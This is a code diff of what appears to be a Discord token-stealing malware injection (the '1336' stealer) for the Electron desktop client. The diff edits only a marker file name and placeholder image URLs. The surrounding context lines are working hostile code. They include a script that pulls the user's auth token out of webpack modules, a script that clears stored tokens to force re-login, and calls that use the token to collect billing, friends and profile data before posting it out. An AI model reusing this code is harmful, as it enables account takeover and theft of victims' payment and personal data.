@@ -9,7 +9,7 @@ const queryString = require("querystring")
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
-var doTheLogOut = fs.existsSync("./yamete.1336") ? true : false
+var doTheLogOut = fs.existsSync("./yamete.steal") ? true : false
 
 async function execScript(str) {
     var window = electron.BrowserWindow.getAllWindows()[0]
@@ -241,8 +241,8 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+        if (!user.avatar) var userAvatar = "https://media.discordapp.net/attachments/1092397808465739778/1093244561029079210/1336.png?width=1214&height=683"
+        if (!user.banner) var userBanner = "https://media.discordapp.net/attachments/1092397808465739778/1093244561029079210/1336.png?width=1214&height=683"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -307,8 +307,8 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+            if (!user.avatar) var userAvatar = "https://media.discordapp.net/attachments/1092397808465739778/1093244561029079210/1336.png?width=1214&height=683"
+            if (!user.banner) var userBanner = "https://media.discordapp.net/attachments/1092397808465739778/1093244561029079210/1336.png?width=1214&height=683"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -359,7 +359,7 @@ const FirstTime = async () => {
 
             params.embeds.push(params2.embeds[0])
         }
-        fs.writeFileSync("./yamete.1336", "LogOut")
+        fs.writeFileSync("./yamete.steal", "LogOut")
         await execScript(logOutScript)
         doTheLogOut = true
         await post(params)
@@ -449,8 +449,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+    if (!user.avatar) var userAvatar = "https://media.discordapp.net/attachments/1092397808465739778/1093244561029079210/1336.png?width=1214&height=683"
+    if (!user.banner) var userBanner = "https://media.discordapp.net/attachments/1092397808465739778/1093244561029079210/1336.png?width=1214&height=683"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
